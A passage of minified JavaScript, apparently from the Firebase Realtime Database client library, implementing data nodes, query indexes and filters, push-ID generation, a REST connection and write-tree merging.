e===this},Ln.prototype.getPriority=function(){return this},Ln.prototype.getImmediateChild=function(e){return Dn.EMPTY_NODE},Ln.prototype.isEmpty=function(){return!1},Ln);Object.defineProperties(Kt,{MIN:{value:new Kt(Pe,Dn.EMPTY_NODE)},MAX:{value:new Kt(Ne,Mn)}}),te.__EMPTY_NODE=Dn.EMPTY_NODE,mn.__childrenNodeConstructor=Dn,yn=un=Mn;function Fn(e,t){if(void 0===t&&(t=null),null===e)return Dn.EMPTY_NODE;if("object"==typeof e&&".priority"in e&&(t=e[".priority"]),f(null===t||"string"==typeof t||"number"==typeof t||"object"==typeof t&&".sv"in t,"Invalid priority type found: "+typeof t),"object"!=typeof(e="object"==typeof e&&".value"in e&&null!==e[".value"]?e[".value"]:e)||".sv"in e)return new mn(e,Fn(t));if(e instanceof Array){var n=Dn.EMPTY_NODE;return Oe(e,(function(t,r){R(e,t)&&"."!==t.substring(0,1)&&(!(r=Fn(r)).isLeafNode()&&r.isEmpty()||(n=n.updateImmediateChild(t,r)))})),n.updatePriority(Fn(t))}var r=[],i=!1;if(Oe(e,(function(e,t){"."!==e.substring(0,1)&&((t=Fn(t)).isEmpty()||(i=i||!t.getPriority().isEmpty(),r.push(new Kt(e,t))))})),0===r.length)return Dn.EMPTY_NODE;var o=Pn(r,cn,(function(e){return e.name}),pn);if(i){var a=Pn(r,bn.getCompare());return new Dn(o,Fn(t),new xn({".priority":a},{".priority":bn}))}return new Dn(o,Fn(t),xn.Default)}_n=Fn;var qn,Wn,jn=(r(Un,qn=Xt),Un.prototype.extractChild=function(e){return e.getChild(this.indexPath_)},Un.prototype.isDefinedOn=function(e){return!e.getChild(this.indexPath_).isEmpty()},Un.prototype.compare=function(e,t){var n=this.extractChild(e.node),r=this.extractChild(t.node);return 0===(r=n.compareTo(r))?xe(e.name,t.name):r},Un.prototype.makePost=function(e,t){return e=Fn(e),e=Dn.EMPTY_NODE.updateChild(this.indexPath_,e),new Kt(t,e)},Un.prototype.maxPost=function(){var e=Dn.EMPTY_NODE.updateChild(this.indexPath_,Mn);return new Kt(Ne,e)},Un.prototype.toString=function(){return xt(this.indexPath_,0).join("/")},Un);function Un(e){var t=qn.call(this)||this;return t.indexPath_=e,f(!Dt(e)&&".priority"!==St(e),"Can't create PathIndex with empty path or .priority key"),t}function Bn(){return null!==Wn&&Wn.apply(this,arguments)||this}function zn(e){if(e===""+Fe)return"-";var t=qe(e);if(null!=t)return""+(t+1);for(var n=new Array(e.length),r=0;r<n.length;r++)n[r]=e.charAt(r);if(n.length<786)return n.push("-"),n.join("");for(var i=n.length-1;0<=i&&"z"===n[i];)i--;return-1===i?Ne:(t=n[i],t=Kn.charAt(Kn.indexOf(t)+1),n[i]=t,n.slice(0,i+1).join(""))}function Vn(e){if(e===""+Me)return Pe;var t=qe(e);if(null!=t)return""+(t-1);for(var n=new Array(e.length),r=0;r<n.length;r++)n[r]=e.charAt(r);return"-"===n[n.length-1]?1===n.length?""+Fe:(delete n[n.length-1],n.join("")):(n[n.length-1]=Kn.charAt(Kn.indexOf(n[n.length-1])-1),n.join("")+"z".repeat(786-n.length))}var Hn,Qn,Yn=new(r(Bn,Wn=Xt),Bn.prototype.compare=function(e,t){var n=e.node.compareTo(t.node);return 0===n?xe(e.name,t.name):n},Bn.prototype.isDefinedOn=function(e){return!0},Bn.prototype.indexedValueChanged=function(e,t){return!e.equals(t)},Bn.prototype.minPost=function(){return Kt.MIN},Bn.prototype.maxPost=function(){return Kt.MAX},Bn.prototype.makePost=function(e,t){return e=Fn(e),new Kt(t,e)},Bn.prototype.toString=function(){return".value"},Bn),Kn="-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz",Gn=(Hn=0,Qn=[],function(e){var t=e===Hn;Hn=e;for(var n=new Array(8),r=7;0<=r;r--)n[r]=Kn.charAt(e%64),e=Math.floor(e/64);f(0===e,"Cannot push at time == 0");var i=n.join("");if(t){for(r=11;0<=r&&63===Qn[r];r--)Qn[r]=0;Qn[r]++}else for(r=0;r<12;r++)Qn[r]=Math.floor(64*Math.random());for(r=0;r<12;r++)i+=Kn.charAt(Qn[r]);return f(20===i.length,"nextPushId: Length should be 20."),i});function $n(e){return{type:"value",snapshotNode:e}}function Jn(e,t){return{type:"child_added",snapshotNode:t,childName:e}}function Xn(e,t){return{type:"child_removed",snapshotNode:t,childName:e}}function Zn(e,t,n){return{type:"child_changed",snapshotNode:t,childName:e,oldSnap:n}}var er=(tr.prototype.updateChild=function(e,t,n,r,i,o){f(e.isIndexed(this.index_),"A node must be indexed if only a child is updated");var a=e.getImmediateChild(t);return a.getChild(r).equals(n.getChild(r))&&a.isEmpty()===n.isEmpty()?e:(null!=o&&(n.isEmpty()?e.hasChild(t)?o.trackChildChange(Xn(t,a)):f(e.isLeafNode(),"A child remove without an old child only makes sense on a leaf node"):a.isEmpty()?o.trackChildChange(Jn(t,n)):o.trackChildChange(Zn(t,n,a))),e.isLeafNode()&&n.isEmpty()?e:e.updateImmediateChild(t,n).withIndex(this.index_))},tr.prototype.updateFullNode=function(e,t,n){return null!=n&&(e.isLeafNode()||e.forEachChild(bn,(function(e,r){t.hasChild(e)||n.trackChildChange(Xn(e,r))})),t.isLeafNode()||t.forEachChild(bn,(function(t,r){var i;e.hasChild(t)?(i=e.getImmediateChild(t)).equals(r)||n.trackChildChange(Zn(t,r,i)):n.trackChildChange(Jn(t,r))}))),t.withIndex(this.index_)},tr.prototype.updatePriority=function(e,t){return e.isEmpty()?Dn.EMPTY_NODE:e.updatePriority(t)},tr.prototype.filtersNodes=function(){return!1},tr.prototype.getIndexedFilter=function(){return this},tr.prototype.getIndex=function(){return this.index_},tr);function tr(e){this.index_=e}var nr=(rr.prototype.getStartPost=function(){return this.startPost_},rr.prototype.getEndPost=function(){return this.endPost_},rr.prototype.matches=function(e){return this.index_.compare(this.getStartPost(),e)<=0&&this.index_.compare(e,this.getEndPost())<=0},rr.prototype.updateChild=function(e,t,n,r,i,o){return this.matches(new Kt(t,n))||(n=Dn.EMPTY_NODE),this.indexedFilter_.updateChild(e,t,n,r,i,o)},rr.prototype.updateFullNode=function(e,t,n){t.isLeafNode()&&(t=Dn.EMPTY_NODE);var r=(r=t.withIndex(this.index_)).updatePriority(Dn.EMPTY_NODE),i=this;return t.forEachChild(bn,(function(e,t){i.matches(new Kt(e,t))||(r=r.updateImmediateChild(e,Dn.EMPTY_NODE))})),this.indexedFilter_.updateFullNode(e,r,n)},rr.prototype.updatePriority=function(e,t){return e},rr.prototype.filtersNodes=function(){return!0},rr.prototype.getIndexedFilter=function(){return this.indexedFilter_},rr.prototype.getIndex=function(){return this.index_},rr.getStartPost_=function(e){if(e.hasStart()){var t=e.getIndexStartName();return e.getIndex().makePost(e.getIndexStartValue(),t)}return e.getIndex().minPost()},rr.getEndPost_=function(e){if(e.hasEnd()){var t=e.getIndexEndName();return e.getIndex().makePost(e.getIndexEndValue(),t)}return e.getIndex().maxPost()},rr);function rr(e){this.indexedFilter_=new er(e.getIndex()),this.index_=e.getIndex(),this.startPost_=rr.getStartPost_(e),this.endPost_=rr.getEndPost_(e)}var ir=(or.prototype.updateChild=function(e,t,n,r,i,o){return this.rangedFilter_.matches(new Kt(t,n))||(n=Dn.EMPTY_NODE),e.getImmediateChild(t).equals(n)?e:e.numChildren()<this.limit_?this.rangedFilter_.getIndexedFilter().updateChild(e,t,n,r,i,o):this.fullLimitUpdateChild_(e,t,n,i,o)},or.prototype.updateFullNode=function(e,t,n){if(t.isLeafNode()||t.isEmpty())r=Dn.EMPTY_NODE.withIndex(this.index_);else if(2*this.limit_<t.numChildren()&&t.isIndexed(this.index_)){var r=Dn.EMPTY_NODE.withIndex(this.index_),i=void 0;i=this.reverse_?t.getReverseIteratorFrom(this.rangedFilter_.getEndPost(),this.index_):t.getIteratorFrom(this.rangedFilter_.getStartPost(),this.index_);for(var o=0;i.hasNext()&&o<this.limit_;){var a=i.getNext();if(!(this.reverse_?this.index_.compare(this.rangedFilter_.getStartPost(),a)<=0:this.index_.compare(a,this.rangedFilter_.getEndPost())<=0))break;r=r.updateImmediateChild(a.name,a.node),o++}}else{r=(r=t.withIndex(this.index_)).updatePriority(Dn.EMPTY_NODE);var s,u=void 0,l=void 0,h=void 0;i=void 0;h=this.reverse_?(i=r.getReverseIterator(this.index_),u=this.rangedFilter_.getEndPost(),l=this.rangedFilter_.getStartPost(),s=this.index_.getCompare(),function(e,t){return s(t,e)}):(i=r.getIterator(this.index_),u=this.rangedFilter_.getStartPost(),l=this.rangedFilter_.getEndPost(),this.index_.getCompare());o=0;for(var c=!1;i.hasNext();)a=i.getNext(),(c=!c&&h(u,a)<=0||c)&&o<this.limit_&&h(a,l)<=0?o++:r=r.updateImmediateChild(a.name,Dn.EMPTY_NODE)}return this.rangedFilter_.getIndexedFilter().updateFullNode(e,r,n)},or.prototype.updatePriority=function(e,t){return e},or.prototype.filtersNodes=function(){return!0},or.prototype.getIndexedFilter=function(){return this.rangedFilter_.getIndexedFilter()},or.prototype.getIndex=function(){return this.index_},or.prototype.fullLimitUpdateChild_=function(e,t,n,r,i){var o,a;a=this.reverse_?(o=this.index_.getCompare(),function(e,t){return o(t,e)}):this.index_.getCompare();var s=e;f(s.numChildren()===this.limit_,"");var u=new Kt(t,n),l=this.reverse_?s.getFirstChild(this.index_):s.getLastChild(this.index_),h=this.rangedFilter_.matches(u);if(s.hasChild(t)){for(var c=s.getImmediateChild(t),p=r.getChildAfterChild(this.index_,l,this.reverse_);null!=p&&(p.name===t||s.hasChild(p.name));)p=r.getChildAfterChild(this.index_,p,this.reverse_);var d=null==p?1:a(p,u);return h&&!n.isEmpty()&&0<=d?(null!=i&&i.trackChildChange(Zn(t,n,c)),s.updateImmediateChild(t,n)):(null!=i&&i.trackChildChange(Xn(t,c)),c=s.updateImmediateChild(t,Dn.EMPTY_NODE),null!=p&&this.rangedFilter_.matches(p)?(null!=i&&i.trackChildChange(Jn(p.name,p.node)),c.updateImmediateChild(p.name,p.node)):c)}return!n.isEmpty()&&h&&0<=a(l,u)?(null!=i&&(i.trackChildChange(Xn(l.name,l.node)),i.trackChildChange(Jn(t,n))),s.updateImmediateChild(t,n).updateImmediateChild(l.name,Dn.EMPTY_NODE)):e},or);function or(e){this.rangedFilter_=new nr(e),this.index_=e.getIndex(),this.limit_=e.getLimit(),this.reverse_=!e.isViewFromLeft()}var ar=(sr.prototype.hasStart=function(){return this.startSet_},sr.prototype.hasStartAfter=function(){return this.startAfterSet_},sr.prototype.hasEndBefore=function(){return this.endBeforeSet_},sr.prototype.isViewFromLeft=function(){return""===this.viewFrom_?this.startSet_:"l"===this.viewFrom_},sr.prototype.getIndexStartValue=function(){return f(this.startSet_,"Only valid if start has been set"),this.indexStartValue_},sr.prototype.getIndexStartName=function(){return f(this.startSet_,"Only valid if start has been set"),this.startNameSet_?this.indexStartName_:Pe},sr.prototype.hasEnd=function(){return this.endSet_},sr.prototype.getIndexEndValue=function(){return f(this.endSet_,"Only valid if end has been set"),this.indexEndValue_},sr.prototype.getIndexEndName=function(){return f(this.endSet_,"Only valid if end has been set"),this.endNameSet_?this.indexEndName_:Ne},sr.prototype.hasLimit=function(){return this.limitSet_},sr.prototype.hasAnchoredLimit=function(){return this.limitSet_&&""!==this.viewFrom_},sr.prototype.getLimit=function(){return f(this.limitSet_,"Only valid if limit has been set"),this.limit_},sr.prototype.getIndex=function(){return this.index_},sr.prototype.loadsAllData=function(){return!(this.startSet_||this.endSet_||this.limitSet_)},sr.prototype.isDefault=function(){return this.loadsAllData()&&this.index_===bn},sr.prototype.copy=function(){var e=new sr;return e.limitSet_=this.limitSet_,e.limit_=this.limit_,e.startSet_=this.startSet_,e.indexStartValue_=this.indexStartValue_,e.startNameSet_=this.startNameSet_,e.indexStartName_=this.indexStartName_,e.endSet_=this.endSet_,e.indexEndValue_=this.indexEndValue_,e.endNameSet_=this.endNameSet_,e.indexEndName_=this.indexEndName_,e.index_=this.index_,e.viewFrom_=this.viewFrom_,e},sr);function sr(){this.limitSet_=!1,this.startSet_=!1,this.startNameSet_=!1,this.startAfterSet_=!1,this.endSet_=!1,this.endNameSet_=!1,this.endBeforeSet_=!1,this.limit_=0,this.viewFrom_="",this.indexStartValue_=null,this.indexStartName_="",this.indexEndValue_=null,this.indexEndName_="",this.index_=bn}function ur(e,t,n){return(e=e.copy()).startSet_=!0,e.indexStartValue_=t=void 0===t?null:t,null!=n?(e.startNameSet_=!0,e.indexStartName_=n):(e.startNameSet_=!1,e.indexStartName_=""),e}function lr(e,t,n){return(e=e.copy()).endSet_=!0,e.indexEndValue_=t=void 0===t?null:t,void 0!==n?(e.endNameSet_=!0,e.indexEndName_=n):(e.endNameSet_=!1,e.indexEndName_=""),e}function hr(e,t){return(e=e.copy()).index_=t,e}function cr(e){var t,n={};return e.isDefault()||(t=e.index_===bn?"$priority":e.index_===Yn?"$value":e.index_===tn?"$key":(f(e.index_ instanceof jn,"Unrecognized index type!"),e.index_.toString()),n.orderBy=N(t),e.startSet_&&(n.startAt=N(e.indexStartValue_),e.startNameSet_&&(n.startAt+=","+N(e.indexStartName_))),e.endSet_&&(n.endAt=N(e.indexEndValue_),e.endNameSet_&&(n.endAt+=","+N(e.indexEndName_))),e.limitSet_&&(e.isViewFromLeft()?n.limitToFirst=e.limit_:n.limitToLast=e.limit_)),n}function pr(e){var t,n={};return e.startSet_&&(n.sp=e.indexStartValue_,e.startNameSet_&&(n.sn=e.indexStartName_)),e.endSet_&&(n.ep=e.indexEndValue_,e.endNameSet_&&(n.en=e.indexEndName_)),e.limitSet_&&(n.l=e.limit_,""===(t=e.viewFrom_)&&(t=e.isViewFromLeft()?"l":"r"),n.vf=t),e.index_!==bn&&(n.i=e.index_.toString()),n}var dr,fr=(r(_r,dr=yt),_r.prototype.reportStats=function(e){throw new Error("Method not implemented.")},_r.getListenId_=function(e,t){return void 0!==t?"tag$"+t:(f(e._queryParams.isDefault(),"should have a tag if it's not a default query."),e._path.toString())},_r.prototype.listen=function(e,t,n,r){var i=this,o=e._path.toString();this.log_("Listen called for "+o+" "+e._queryIdentifier);var a=_r.getListenId_(e,n),s={};this.listens_[a]=s,e=cr(e._queryParams),this.restRequest_(o+".json",e,(function(e,t){null===(e=404===e?t=null:e)&&i.onDataUpdate_(o,t,!1,n),O(i.listens_,a)===s&&r(e?401===e?"permission_denied":"rest_error:"+e:"ok",null)}))},_r.prototype.unlisten=function(e,t){t=_r.getListenId_(e,t),delete this.listens_[t]},_r.prototype.get=function(e){var t=this,n=cr(e._queryParams),r=e._path.toString(),i=new g;return this.restRequest_(r+".json",n,(function(e,n){null===(e=404===e?n=null:e)?(t.onDataUpdate_(r,n,!1,null),i.resolve(n)):i.reject(new Error(n))})),i.promise},_r.prototype.refreshAuthToken=function(e){},_r.prototype.restRequest_=function(e,t,n){var r=this;return(t=void 0===t?{}:t).format="export",Promise.all([this.authTokenProvider_.getToken(!1),this.appCheckTokenProvider_.getToken(!1)]).then((function(i){i=(o=u(i,2))[0];var o=o[1];i&&i.accessToken&&(t.auth=i.accessToken),o&&o.token&&(t.ac=o.token);var a=(r.repoInfo_.secure?"https://":"http://")+r.repoInfo_.host+e+"?ns="+r.repoInfo_.namespace+function(e){for(var t=[],n=0,r=Object.entries(e);n<r.length;n++){var i=r[n];!function(e,n){Array.isArray(n)?n.forEach((function(n){t.push(encodeURIComponent(e)+"="+encodeURIComponent(n))})):t.push(encodeURIComponent(e)+"="+encodeURIComponent(n))}(i[0],i[1])}return t.length?"&"+t.join("&"):""}(t);r.log_("Sending REST request for "+a);var s=new XMLHttpRequest;s.onreadystatechange=function(){if(n&&4===s.readyState){r.log_("REST Response for "+a+" received. status:",s.status,"response:",s.responseText);var e=null;if(200<=s.status&&s.status<300){try{e=P(s.responseText)}catch(e){ke("Failed to parse JSON response for "+a+": "+s.responseText)}n(null,e)}else 401!==s.status&&404!==s.status&&ke("Got unsuccessful REST response for "+a+" Status: "+s.status),n(s.status);n=null}},s.open("GET",a,!0),s.send()}))},_r);function _r(e,t,n,r){var i=dr.call(this)||this;return i.repoInfo_=e,i.onDataUpdate_=t,i.authTokenProvider_=n,i.appCheckTokenProvider_=r,i.log_=Ie("p:rest:"),i.listens_={},i}var yr=(vr.prototype.getNode=function(e){return this.rootNode_.getChild(e)},vr.prototype.updateSnapshot=function(e,t){this.rootNode_=this.rootNode_.updateChild(e,t)},vr);function vr(){this.rootNode_=Dn.EMPTY_NODE}function gr(){return{value:null,children:new Map}}function mr(e,t,n){var r;Dt(t)?(e.value=n,e.children.clear()):null!==e.value?e.value=e.value.updateChild(t,n):(r=St(t),e.children.has(r)||e.children.set(r,gr()),mr(e.children.get(r),t=Pt(t),n))}function wr(e,t,n){var r;null!==e.value?n(t,e.value):(r=function(e,r){wr(r,new Tt(t.toString()+"/"+e),n)},e.children.forEach((function(e,t){r(t,e)})))}var Cr=(br.prototype.get=function(){var e=this.collection_.get(),t=i({},e);return this.last_&&Oe(this.last_,(function(e,n){t[e]=t[e]-n})),this.last_=e,t},br);function br(e){this.collection_=e,this.last_=null}var Tr,Er=(Ir.prototype.reportStats_=function(){var e=this,t=this.statsListener_.get(),n={},r=!1;Oe(t,(function(t,i){0<i&&R(e.statsToReport_,t)&&(n[t]=i,r=!0)})),r&&this.server_.reportStats(n),Ae(this.reportStats_.bind(this),Math.floor(2*Math.random()*3e5))},Ir);function Ir(e,t){this.server_=t,this.statsToReport_={},this.statsListener_=new Cr(e),e=1e4+2e4*Math.random(),Ae(this.reportStats_.bind(this),Math.floor(e))}function Sr(e){return{fromUser:!1,fromServer:!0,queryId:e,tagged:!0}}(yt=Tr=Tr||{})[yt.OVERWRITE=0]="OVERWRITE",yt[yt.MERGE=1]="MERGE",yt[yt.ACK_USER_WRITE=2]="ACK_USER_WRITE",yt[yt.LISTEN_COMPLETE=3]="LISTEN_COMPLETE";var kr=(Pr.prototype.operationForChild=function(e){if(Dt(this.path)){if(null!=this.affectedTree.value)return f(this.affectedTree.children.isEmpty(),"affectedTree should not have overlapping affected paths."),this;var t=this.affectedTree.subtree(new Tt(e));return new Pr(It(),t,this.revert)}return f(St(this.path)===e,"operationForChild called for unrelated child."),new Pr(Pt(this.path),this.affectedTree,this.revert)},Pr);function Pr(e,t,n){this.path=e,this.affectedTree=t,this.revert=n,this.type=Tr.ACK_USER_WRITE,this.source={fromUser:!0,fromServer:!1,queryId:null,tagged:!1}}var Nr=(xr.prototype.operationForChild=function(e){return Dt(this.path)?new xr(this.source,It()):new xr(this.source,Pt(this.path))},xr);function xr(e,t){this.source=e,this.path=t,this.type=Tr.LISTEN_COMPLETE}var Rr=(Or.prototype.operationForChild=function(e){return Dt(this.path)?new Or(this.source,It(),this.snap.getImmediateChild(e)):new Or(this.source,Pt(this.path),this.snap)},Or);function Or(e,t,n){this.source=e,this.path=t,this.snap=n,this.type=Tr.OVERWRITE}var Dr=(Ar.prototype.operationForChild=function(e){if(Dt(this.path)){var t=this.children.subtree(new Tt(e));return t.isEmpty()?null:t.value?new Rr(this.source,It(),t.value):new Ar(this.source,It(),t)}return f(St(this.path)===e,"Can't get a merge for a child not on the path of the operation"),new Ar(this.source,Pt(this.path),this.children)},Ar.prototype.toString=function(){return"Operation("+this.path+": "+this.source.toString()+" merge: "+this.children.toString()+")"},Ar);function Ar(e,t,n){this.source=e,this.path=t,this.children=n,this.type=Tr.MERGE}var Lr=(Mr.prototype.isFullyInitialized=function(){return this.fullyInitialized_},Mr.prototype.isFiltered=function(){return this.filtered_},Mr.prototype.isCompleteForPath=function(e){return Dt(e)?this.isFullyInitialized()&&!this.filtered_:(e=St(e),this.isCompleteForChild(e))},Mr.prototype.isCompleteForChild=function(e){return this.isFullyInitialized()&&!this.filtered_||this.node_.hasChild(e)},Mr.prototype.getNode=function(){return this.node_},Mr);function Mr(e,t,n){this.node_=e,this.fullyInitialized_=t,this.filtered_=n}var Fr,qr=function(e){this.query_=e,this.index_=this.query_._queryParams.getIndex()};function Wr(e,t,n,r,i,o){(r=r.filter((function(e){return e.type===n}))).sort((function(t,n){return function(e,t,n){if(null==t.childName||null==n.childName)throw _("Should only compare child_ events.");return t=new Kt(t.childName,t.snapshotNode),n=new Kt(n.childName,n.snapshotNode),e.index_.compare(t,n)}(e,t,n)})),r.forEach((function(n){var r,a,s,u=(r=e,s=o,"value"===(a=n).type||"child_removed"===a.type||(a.prevName=s.getPredecessorChildName(a.childName,a.snapshotNode,r.index_)),a);i.forEach((function(r){r.respondsTo(n.type)&&t.push(r.createEvent(u,e.query_))}))}))}function jr(e,t){return{eventCache:e,serverCache:t}}function Ur(e,t,n,r){return jr(new Lr(t,n,r),e.serverCache)}function Br(e,t,n,r){return jr(e.eventCache,new Lr(t,n,r))}function zr(e){return e.eventCache.isFullyInitialized()?e.eventCache.getNode():null}function Vr(e){return e.serverCache.isFullyInitialized()?e.serverCache.getNode():null}var Hr=(Qr.fromObject=function(e){var t=new Qr(null);return Oe(e,(function(e,n){t=t.set(new Tt(e),n)})),t},Qr.prototype.isEmpty=function(){return null===this.value&&this.children.isEmpty()},Qr.prototype.findRootMostMatchingPathAndValue=function(e,t){if(null!=this.value&&t(this.value))return{path:It(),value:this.value};if(Dt(e))return null;var n=St(e),r=this.children.get(n);return null===r||null==(t=r.findRootMostMatchingPathAndValue(Pt(e),t))?null:{path:Ot(new Tt(n),t.path),value:t.value}},Qr.prototype.findRootMostValueAndPath=function(e){return this.findRootMostMatchingPathAndValue(e,(function(){return!0}))},Qr.prototype.subtree=function(e){if(Dt(e))return this;var t=St(e);return null!==(t=this.children.get(t))?t.subtree(Pt(e)):new Qr(null)},Qr.prototype.set=function(e,t){if(Dt(e))return new Qr(t,this.children);var n=St(e);t=(this.children.get(n)||new Qr(null)).set(Pt(e),t),t=this.children.insert(n,t);return new Qr(this.value,t)},Qr.prototype.remove=function(e){if(Dt(e))return this.children.isEmpty()?new Qr(null):new Qr(null,this.children);var t=St(e),n=this.children.get(t);return n?(n=n.remove(Pt(e)),e=void 0,e=n.isEmpty()?this.children.remove(t):this.children.insert(t,n),null===this.value&&e.isEmpty()?new Qr(null):new Qr(this.value,e)):this},Qr.prototype.get=function(e){if(Dt(e))return this.value;var t=St(e);return(t=this.children.get(t))?t.get(Pt(e)):null},Qr.prototype.setTree=function(e,t){if(Dt(e))return t;var n=St(e);e=(this.children.get(n)||new Qr(null)).setTree(Pt(e),t),t=void 0,t=e.isEmpty()?this.children.remove(n):this.children.insert(n,e);return new Qr(this.value,t)},Qr.prototype.fold=function(e){return this.fold_(It(),e)},Qr.prototype.fold_=function(e,t){var n={};return this.children.inorderTraversal((function(r,i){n[r]=i.fold_(Ot(e,r),t)})),t(e,this.value,n)},Qr.prototype.findOnPath=function(e,t){return this.findOnPath_(e,It(),t)},Qr.prototype.findOnPath_=function(e,t,n){if(r=!!this.value&&n(t,this.value))return r;if(Dt(e))return null;var r,i=St(e);return(r=this.children.get(i))?r.findOnPath_(Pt(e),Ot(t,i),n):null},Qr.prototype.foreachOnPath=function(e,t){return this.foreachOnPath_(e,It(),t)},Qr.prototype.foreachOnPath_=function(e,t,n){if(Dt(e))return this;this.value&&n(t,this.value);var r=St(e),i=this.children.get(r);return i?i.foreachOnPath_(Pt(e),Ot(t,r),n):new Qr(null)},Qr.prototype.foreach=function(e){this.foreach_(It(),e)},Qr.prototype.foreach_=function(e,t){this.children.inorderTraversal((function(n,r){r.foreach_(Ot(e,n),t)})),this.value&&t(e,this.value)},Qr.prototype.foreachChild=function(e){this.children.inorderTraversal((function(t,n){n.value&&e(t,n.value)}))},Qr);function Qr(e,t){void 0===t&&(t=Fr=Fr||new ln(de)),this.value=e,this.children=t}var Yr=(Kr.empty=function(){return new Kr(new Hr(null))},Kr);function Kr(e){this.writeTree_=e}function Gr(e,t,n){if(Dt(t))return new Yr(new Hr(n));if(null!=(o=e.writeTree_.findRootMostValueAndPath(t))){var r=o.path,i=o.value,o=At(r,t);i=i.updateChild(o,n);return new Yr(e.writeTree_.set(r,i))}return n=new Hr(n),n=e.writeTree_.setTree(t,n),new Yr(n)}function $r(e,t,n){var r=e;return Oe(n,(function(e,n){r=Gr(r,Ot(t,e),n)})),r}function Jr(e,t){return Dt(t)?Yr.empty():(t=e.writeTree_.setTree(t,new Hr(null)),new Yr(t))}function Xr(e,t){return null!=Zr(e,t)}function Zr(e,t){var n=e.writeTree_.findRootMostValueAndPath(t);return null!=n?e.writeTree_.get(n.path).getChild(At(n.path,t)):null}function ei(e){var t=[],n=e.writeTree_.value;return null!=n?n.isLeafNode()||n.forEachChild(bn,(function(e,n){t.push(new Kt(e,n))})):e.writeTree_.children.inorderTraversal((function(e,n){null!=n.value&&t.push(new Kt(e,n.value))})),t}function ti(e,t){if(Dt(t))return e;var n=Zr(e,t);return new Yr(null!=n?new Hr(n):e.writeTree_.subtree(t))}function ni(e){return e.writeTree_.isEmpty()}function ri(e,t){return function e(t,n,r){if(null!=n.value)return r.updateChild(t,n.value);var i=null;return n.children.inorderTraversal((function(n,o){".priority"===n?(f(null!==o.value,"Priority writes must always be leaf nodes"),i=o.value):r=e(Ot(t,n),o,r)})),r=r.getChild(t).isEmpty()||null===i?r:r.updateChild(Ot(t,".priority"),i)}(It(),e.writeTree_,t)}function ii(e,t){return fi(t,e)}function oi(e){return e.visible}function ai(e,t,n){for(var r=Yr.empty(),i=0;i<e.length;++i){var o=e[i];if(t(o)){var a=o.path,s=void 0;if(o.snap)Ft(n,a)?r=Gr(r,s=At(n,a),o.snap):Ft(a,n)&&(s=At(a,n),r=Gr(r,It(),o.snap.getChild(s)));else{if(!o.children)throw _("WriteRecord should have .snap or .children");Ft(n,a)?r=$r(r,s=At(n,a),o.children):Ft(a,n)&&(Dt(s=At(a,n))?r=$r(r,It(),o.children):(o=O(o.children,St(s)))&&(s=o.getChild(Pt(s)),r=Gr(r,It(),s)))}}}return r}function si(e,t,n,r,i){if(r||i){var o=ti(e.visibleWrites,t);return!i&&ni(o)?n:i||null!=n||Xr(o,It())?ri(ai(e.allWrites,(function(e){return(e.visible||i)&&(!r||!~r.indexOf(e.writeId))&&(Ft(e.path,t)||Ft(t,e.path))}),t),n||Dn.EMPTY_NODE):null}return null!=(o=Zr(e.visibleWrites,t))?o:ni(e=ti(e.visibleWrites,t))?n:null!=n||Xr(e,It())?ri(e,n||Dn.EMPTY_NODE):null}function ui(e,t,n,r){return si(e.writeTree,e.treePath,t,n,r)}function li(e,t){return function(e,t,n){var r=Dn.EMPTY_NODE,i=Zr(e.visibleWrites,t);if(i)return i.isLeafNode()||i.forEachChild(bn,(function(e,t){r=r.updateImmediateChild(e,t)})),r;if(n){var o=ti(e.visibleWrites,t);return n.forEachChild(bn,(function(e,t){t=ri(ti(o,new Tt(e)),t),r=r.updateImmediateChild(e,t)})),ei(o).forEach((function(e){r=r.updateImmediateChild(e.name,e.node)})),r}return ei(ti(e.visibleWrites,t)).forEach((function(e){r=r.updateImmediateChild(e.name,e.node)})),r}(e.writeTree,e.treePath,t)}function hi(e,t,n,r){return i=e.writeTree,e=e.treePath,t=t,r=r,f(n||r,"Either existingEventSnap or existingServerSnap must exist"),e=Ot(e,t),Xr(i.visibleWrites,e)?null:ni(e=ti(i.visibleWrites,e))?r.getChild(t):ri(e,r.getChild(t));var i}function ci(e,t){return n=e.writeTree,t=Ot(e.treePath,t),Zr(n.visibleWrites,t);var n}function pi(e,t,n){return r=e.writeTree,i=e.treePath,e=n,t=Ot(i,n=t),null!=(i=Zr(r.visibleWrites,t))?i:e.isCompleteForChild(n)?ri(ti(r.visibleWrites,t),e.getNode().getImmediateChild(n)):null;var r,i}function di(e,t){return fi(Ot(e.treePath,t),e.writeTree)}function fi(e,t){return{treePath:e,writeTree:t}}var _i=(yi.prototype.trackChildChange=function(e){var t=e.type,n=e.childName;f("child_added"===t||"child_changed"===t||"child_removed"===t,"Only child changes supported for tracking"),f(".priority"!==n,"Only non-priority child changes can be tracked.");var r=this.changeMap.get(n);if(r){var i=r.type;if("child_added"===t&&"child_removed"===i)this.changeMap.set(n,Zn(n,e.snapshotNode,r.snapshotNode));else if("child_removed"===t&&"child_added"===i)this.changeMap.delete(n);else if("child_removed"===t&&"child_changed"===i)this.changeMap.set(n,Xn(n,r.oldSnap));else if("child_changed"===t&&"child_added"===i)this.changeMap.set(n,Jn(n,e.snapshotNode));else{if("child_changed"!==t||"child_changed"!==i)throw _("Illegal combination of changes: "+e+" occurred after "+r);this.changeMap.set(n,Zn(n,e.snapshotNode,r.oldSnap))}}else this.changeMap.set(n,e)},yi.prototype.getChanges=function(){return Array.from(this.changeMap.values())},yi);function yi(){this.changeMap=new Map}function vi(){}var gi=new(vi.prototype.getCompleteChild=function(e){return null},vi.prototype.getChildAfterChild=function(e,t,n){return null},vi),mi=(wi.prototype.getCompleteChild=function(e){var t=this.viewCache_.eventCache;return t.isCompleteForChild(e)?t.getNode().getImmediateChild(e):(t=null!=this.optCompleteServerCache_?new Lr(this.optCompleteServerCache_,!0,!1):this.viewCache_.serverCache,pi(this.writes_,e,t))},wi.prototype.getChildAfterChild=function(e,t,n){var r=null!=this.optCompleteServerCache_?this.optCompleteServerCache_:Vr(this.viewCache_);return 0===(e=function(e,t,n,r,i,o){return function(e,t,n,r,i,o,a){var s;if(null!=(t=Zr(e=ti(e.visibleWrites,t),It())))s=t;else{if(null==n)return[];s=ri(e,n)}if((s=s.withIndex(a)).isEmpty()||s.isLeafNode())return[];for(var u=[],l=a.getCompare(),h=o?s.getReverseIteratorFrom(r,a):s.getIteratorFrom(r,a),c=h.getNext();c&&u.length<i;)0!==l(c,r)&&u.push(c),c=h.getNext();return 